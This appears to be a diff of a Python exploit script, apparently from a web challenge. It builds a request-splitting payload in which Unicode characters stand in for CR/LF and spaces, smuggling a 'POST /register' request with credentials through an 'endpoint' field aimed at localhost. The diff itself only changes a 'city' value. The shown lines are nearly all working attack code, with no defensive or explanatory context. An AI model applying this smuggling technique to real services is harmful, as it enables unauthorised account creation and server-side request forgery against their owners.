@@ -13,4 +13,4 @@ test = "localhost/abc\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u
 test = test + "Content-Length:\u0120" + str(contentLength) + "\u010D\u010A\u010D\u010A"
 test = test + f"username={parsedUser}&password={parsedPass}" + "\u010D\u010A\u010D\u010AGET\u0120/?q="
  
-r = requests.post(url = url, json={'endpoint': test, 'city': 'Da Nang','country': 'VN'})
+r = requests.post(url = url, json={'endpoint': test, 'city': 'OII','country': 'VN'})
